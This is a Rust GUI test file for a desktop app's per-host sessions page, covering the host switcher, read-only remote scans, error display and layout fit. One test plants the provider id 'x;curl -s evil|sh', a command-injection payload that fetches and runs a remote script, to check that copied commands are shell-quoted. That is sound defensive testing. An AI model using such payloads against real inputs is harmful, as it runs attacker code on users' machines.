#![allow(missing_docs)]
//! Sessions per host (UX §3.7, plan §5 B6): the host switcher lists this computer
//! and the hosts the desktop app is connected to (never ssh-config entries), a
//! remote host is scanned read-only with the migrate command to copy, an
//! unreachable host shows its error (keeping earlier numbers greyed), commands
//! select hosts, and the page fits both window sizes in both languages.

mod support;

use std::sync::Arc;
use std::time::{Duration, Instant};

use superba_core::{
    HostSource, Locale, RemoteHost, RemoteOverview, SshEndpoint, SwitchService, TargetId, Timestamp,
};
use superba_gui::design::{Palette, fonts, style};
use superba_gui::i18n::Tr;
use superba_gui::pages::sessions::{self, State};
use superba_gui::pages::{Action, Cx, Data};
use support::fake::{FakeOptions, FakeService};
use support::fit::{SIZES, render_fit};

fn fake() -> Arc<FakeService> {
    Arc::new(FakeService::new(FakeOptions {
        fast: true,
        ..Default::default()
    }))
}

async fn data_of(service: &FakeService) -> Data {
    let mut data = Data {
        sites: service.sites().await.unwrap(),
        ..Data::default()
    };
    data.overview.finish(service.overview().await);
    data.profiles.finish(service.profile_set().await);
    data.sessions.finish(service.sessions().await);
    data
}

fn host(id: &str, sources: Vec<HostSource>) -> RemoteOverview {
    RemoteOverview {
        host: RemoteHost {
            target_id: TargetId::remote(id),
            label: id.into(),
            host_id: None,
            kind: superba_core::HostKind::Ssh,
            ssh: SshEndpoint {
                alias: Some(id.into()),
                ..SshEndpoint::default()
            },
            sources,
            connected: Some(true),
            wsl: None,
        },
        state: None,
        error: None,
    }
}

fn target(data: &Data, label: &str) -> TargetId {
    data.overview
        .value
        .as_ref()
        .unwrap()
        .remotes
        .iter()
        .find(|r| r.host.label == label)
        .unwrap()
        .host
        .target_id
        .clone()
}

fn with_cx<T>(data: &Data, service: &Arc<dyn SwitchService>, f: impl FnOnce(&Cx<'_>) -> T) -> T {
    let tr = Tr::new(Locale::En);
    let fonts_report = fonts::FontReport::default();
    let cx = Cx {
        tr: &tr,
        pal: &superba_gui::design::tokens::LIGHT,
        data,
        busy: false,
        now: Timestamp::now(),
        fonts: &fonts_report,
        service,
        log: &[],
    };
    f(&cx)
}

/// Draw the page until `done` holds (or 3 s); returns actions and texts.
fn drive(
    data: &Data,
    service: Arc<dyn SwitchService>,
    state: &mut State,
    locale: Locale,
    mut done: impl FnMut(&State, &str) -> bool,
) -> (Vec<Action>, String) {
    let ctx = egui::Context::default();
    let report = fonts::FontReport::default();
    ctx.set_fonts(fonts::definitions(&report));
    style::install(&ctx, Some(egui::Theme::Light));
    let tr = Tr::new(locale);
    let mut actions = Vec::new();
    let mut text = String::new();
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(3) {
        let out = ctx.run_ui(
            egui::RawInput {
                screen_rect: Some(egui::Rect::from_min_size(
                    egui::Pos2::ZERO,
                    egui::vec2(1060.0, 760.0),
                )),
                ..Default::default()
            },
            |ui| {
                let cx = Cx {
                    tr: &tr,
                    pal: Palette::of(ui.ctx()),
                    data,
                    busy: false,
                    now: Timestamp::now(),
                    fonts: &report,
                    service: &service,
                    log: &[],
                };
                sessions::show(ui, &cx, state, &mut actions);
            },
        );
        text = out
            .shapes
            .iter()
            .filter_map(|s| match &s.shape {
                egui::Shape::Text(t) => Some(t.galley.text().to_owned()),
                _ => None,
            })
            .collect::<Vec<_>>()
            .join("\n");
        out.drop_without_applying_deltas();
        if done(state, &text) {
            break;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
    (actions, text)
}

#[tokio::test]
async fn the_switcher_lists_this_computer_and_app_hosts_but_never_ssh_config_entries() {
    let service = fake();
    let mut data = data_of(&service).await;
    data.overview
        .value
        .as_mut()
        .unwrap()
        .remotes
        .push(host("from-ssh-config", vec![HostSource::SshConfig]));
    let svc: Arc<dyn SwitchService> = service.clone();
    let labels: Vec<String> = with_cx(&data, &svc, |cx| {
        sessions::hosts(cx).into_iter().map(|h| h.label).collect()
    });
    assert_eq!(labels, vec!["devbox", "gpu-01"]);
    let mut state = State::default();
    let (_, text) = drive(&data, svc, &mut state, Locale::ZhCn, |_, _| true);
    assert!(text.contains("本机"), "{text}");
    assert!(text.contains("devbox"), "{text}");
    assert!(!text.contains("from-ssh-config"), "{text}");
    // This computer: totals, the hidden provider's migrate button and the history.
    assert!(text.contains("会话总数"), "{text}");
    assert!(text.contains("迁移历史 · 本机"), "{text}");
}

#[tokio::test]
async fn more_than_four_hosts_share_a_more_menu() {
    let service = fake();
    let mut data = data_of(&service).await;
    for id in ["h3", "h4", "h5"] {
        data.overview
            .value
            .as_mut()
            .unwrap()
            .remotes
            .push(host(id, vec![HostSource::GlobalState]));
    }
    let svc: Arc<dyn SwitchService> = service.clone();
    let mut state = State::default();
    let (_, text) = drive(&data, svc, &mut state, Locale::En, |_, _| true);
    assert!(text.contains("h4"), "{text}");
    assert!(
        !text.contains("h5"),
        "the fifth host is in the menu: {text}"
    );
    // "More" with a drawn chevron (the bundled fonts have no small triangle).
    assert!(text.lines().any(|l| l == "More"), "{text}");
}

#[tokio::test]
async fn a_remote_host_is_scanned_read_only_with_the_migrate_command_to_copy() {
    let service = fake();
    let data = data_of(&service).await;
    let devbox = target(&data, "devbox");
    let svc: Arc<dyn SwitchService> = service.clone();
    let mut state = State::default();
    with_cx(&data, &svc, |cx| {
        sessions::command(&mut state, cx, &format!("host:{devbox}"), &mut Vec::new())
    });
    assert_eq!(state.host, Some(devbox.clone()));
    drive(&data, svc.clone(), &mut state, Locale::ZhCn, |s, _| {
        s.remote.get(&devbox).is_some_and(|r| r.value.is_some())
    });
    let (_, text) = drive(&data, svc, &mut state, Locale::ZhCn, |_, t| {
        t.contains("248")
    });
    assert!(text.contains("248"), "total: {text}");
    assert!(text.contains("236"), "visible: {text}");
    assert!(text.contains("扫描于"), "{text}");
    assert!(text.contains("通过 SSH"), "{text}");
    assert!(text.contains("spb sessions migrate --from krill"), "{text}");
    assert!(text.contains("无法从这里迁移该主机的会话"), "{text}");
    assert!(
        !text.contains("迁移到 openai…"),
        "no migrate button for a remote host: {text}"
    );
    assert_eq!(service.host_scans(), vec![devbox.clone()]);
}

#[tokio::test]
async fn provider_ids_from_a_host_are_shell_quoted_in_the_commands_to_copy() {
    let service = fake();
    let data = data_of(&service).await;
    let gpu = target(&data, "gpu-01");
    // A provider id read from a rollout file on the host.
    service.set_host_providers(&gpu, &[("openai", 41), ("x;curl -s evil|sh", 3)]);
    let svc: Arc<dyn SwitchService> = service.clone();
    let mut state = State::default();
    with_cx(&data, &svc, |cx| state.select(cx, Some(gpu.clone())));
    let quoted = "spb sessions migrate --from 'x;curl -s evil|sh'";
    let (_, text) = drive(&data, svc.clone(), &mut state, Locale::En, |_, t| {
        t.contains("--from")
    });
    assert!(text.contains(quoted), "{text}");
    assert!(!text.contains("--from x;curl"), "{text}");
    // The provider row's copy button copies the same quoted command.
    let h = support::ui::Harness::new([1060.0, 760.0], egui::Theme::Light);
    let tr = Tr::new(Locale::En);
    let mut actions = Vec::new();
    let clicked = h.click_text("Copy command", &mut |ui| {
        let cx = Cx {
            tr: &tr,
            pal: Palette::of(ui.ctx()),
            data: &data,
            busy: false,
            now: Timestamp::now(),
            fonts: &h.fonts,
            service: &svc,
            log: &[],
        };
        sessions::show(ui, &cx, &mut state, &mut actions);
    });
    assert!(clicked, "no copy button for the hidden provider");
    let copied: Vec<&str> = actions
        .iter()
        .filter_map(|a| match a {
            Action::Copy(c) => Some(c.as_str()),
            _ => None,
        })
        .collect();
    assert_eq!(copied, vec![quoted]);
}

#[tokio::test]
async fn an_unreachable_host_shows_the_error_and_keeps_earlier_numbers() {
    let service = fake();
    let data = data_of(&service).await;
    let gpu = target(&data, "gpu-01");
    let svc: Arc<dyn SwitchService> = service.clone();
    // First scan fails: the error with a hint.
    service.fail_host_sessions(&gpu, true);
    let mut state = State::default();
    with_cx(&data, &svc, |cx| state.select(cx, Some(gpu.clone())));
    let (_, text) = drive(&data, svc.clone(), &mut state, Locale::ZhCn, |_, t| {
        t.contains("无法连接 gpu-01")
    });
    assert!(text.contains("无法连接 gpu-01"), "{text}");
    // After a good scan, a failed rescan keeps the numbers and shows the error.
    service.fail_host_sessions(&gpu, false);
    with_cx(&data, &svc, |cx| state.scan(cx, &gpu));
    drive(&data, svc.clone(), &mut state, Locale::ZhCn, |s, _| {
        s.remote.get(&gpu).is_some_and(|r| r.value.is_some())
    });
    service.fail_host_sessions(&gpu, true);
    with_cx(&data, &svc, |cx| state.scan(cx, &gpu));
    let (_, text) = drive(&data, svc, &mut state, Locale::ZhCn, |s, t| {
        s.remote.get(&gpu).is_some_and(|r| r.error.is_some()) && t.contains("无法连接")
    });
    assert!(text.contains("41"), "earlier numbers stay: {text}");
    assert!(text.contains("无法连接 gpu-01"), "{text}");
}

#[tokio::test]
async fn the_command_copy_and_local_commands_produce_actions() {
    let service = fake();
    let data = data_of(&service).await;
    let svc: Arc<dyn SwitchService> = service.clone();
    let mut state = State::default();
    let mut out = Vec::new();
    with_cx(&data, &svc, |cx| {
        sessions::command(&mut state, cx, "rescan", &mut out);
        sessions::command(&mut state, cx, "host:local", &mut out);
        sessions::command(&mut state, cx, "host:unknown", &mut out);
        // Palette: one entry per app host, addressed to this page.
        let items = sessions::palette(cx, &state);
        assert_eq!(items.len(), 2);
    });
    assert!(matches!(out.as_slice(), [Action::LoadSessions]), "{out:?}");
    assert_eq!(state.host, None);
}

#[tokio::test]
async fn sessions_fit_both_sizes_and_locales_for_this_computer_and_a_host() {
    let service = fake();
    let data = data_of(&service).await;
    let devbox = target(&data, "devbox");
    let remote = service.host_sessions(&devbox).await;
    for size in SIZES {
        for locale in [Locale::En, Locale::ZhCn] {
            for selected in [None, Some(devbox.clone())] {
                let mut state = State::default();
                if let Some(h) = &selected {
                    state.set_remote(h.clone(), remote.clone());
                    state.host = Some(h.clone());
                }
                let report = render_fit(size, locale, egui::Theme::Dark, &data, |ui, cx, out| {
                    sessions::show(ui, cx, &mut state, out);
                });
                assert!(!report.scrolled, "{size:?} {locale:?} {selected:?}");
                assert_eq!(report.scroll_areas, 0, "{size:?} {locale:?} {selected:?}");
                assert!(
                    report.fits(),
                    "{size:?} {locale:?} {selected:?}: {report:?}"
                );
            }
        }
    }
}
